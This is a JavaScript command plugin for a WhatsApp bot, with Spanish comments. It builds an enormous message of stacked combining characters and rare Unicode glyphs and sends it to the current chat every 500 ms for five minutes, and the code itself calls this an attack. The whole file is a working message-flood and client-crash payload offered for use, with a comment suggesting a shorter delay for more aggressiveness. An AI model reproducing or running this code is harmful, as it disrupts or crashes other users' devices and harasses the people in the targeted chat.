let handler = async (m, { conn }) => {
  if (!m.fromMe) return; // Solo el bot puede usarlo

  const target = m.chat;
  const pushname = conn.getName(m.sender);
  const mensaje = "🧪‌⃰Ꮡ‌‌" + "⛧ Zall :: CONCƱΣЯЯOR ⛧" +
    "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
  const start = Date.now();
  const duration = 5 * 60 * 1000; // 5 minutos

  await conn.sendMessage(m.chat, { text: "🐢 Iniciando ataque..." }, { quoted: m });

  try {
    while (Date.now() - start < duration) {
      await conn.sendMessage(target, {
        text: mensaje,
        contextInfo: {
          externalAdReply: {
            title: "⛧ Zall :: CONCƱΣЯЯOR ⛧",
            body: `Haii ${pushname}`,
            previewType: "PHOTO",
            thumbnail: null,
            sourceUrl: "https://example.com/tama"
          }
        }
      }, { quoted: m });

      await delay(500); // puedes ajustar a 200ms si quieres más agresividad
    }

    await conn.sendMessage(m.chat, { text: "🦊 Ataque finalizado" }, { quoted: m });
  } catch (e) {
    await conn.sendMessage(m.chat, { text: "❌ Error al ejecutar ataque:\n" + e.message }, { quoted: m });
  }
};

handler.command = ["comoestas"];
handler.rowner = true;
export default handler;